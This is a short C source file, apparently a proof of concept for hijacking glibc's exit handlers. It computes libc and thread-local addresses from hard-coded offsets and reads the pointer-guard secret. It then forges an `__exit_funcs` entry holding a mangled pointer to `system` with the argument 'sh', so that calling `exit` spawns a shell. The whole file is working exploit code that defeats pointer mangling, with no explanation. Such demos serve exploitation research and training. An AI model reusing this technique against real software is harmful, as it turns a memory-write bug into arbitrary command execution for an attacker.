#include <stdlib.h>
#include <gperftools/malloc_hook_c.h>

struct Exit_function
{
    long int flavor;
    union
        {
            void (*at) (void);
            struct
            {
                void (*fn) (int status, void *arg);
                void *arg;
            } on;
            struct
            {
                void (*fn) (void *arg, int status);
                void *arg;
                void *dso_handle;
            } cxa;
        } func;
};

struct Exit_function_list
{
    struct Exit_function_list *next;
    size_t idx;
    struct Exit_function fns[32];
};

enum
{
    ef_free,
    ef_us,
    ef_on,
    ef_at,
    ef_cxa
};

long rol(long value, unsigned int bits) {
    return (value << bits) | (value >> (64 - bits));
}

int main()
{
    long libc_base = (long)&exit - 0x47b90;
    long tls_base = libc_base - 0x3000;
    long fs30 = *(long*)(tls_base+0x740+0x30);
    // long tls = tls_base + 0x740;
    // long cur_adr = tls - 88;
    // *(long*)cur_adr = 1;
    long __exit_funcs = libc_base + 0x203680;

    struct Exit_function_list* exit_list = malloc(0x500);
    exit_list->idx = 0x5;

    struct Exit_function* f = &exit_list->fns[exit_list->idx-1];
    f->flavor = ef_cxa;
    f->func.on.fn = (void(*)(int, void*))rol((long)(((long)&system)^(fs30)), 0x11);

    char sh[3] = "sh\x00";
    f->func.on.arg = sh;

    *(long**)__exit_funcs = (long*)exit_list;

    exit(0);
}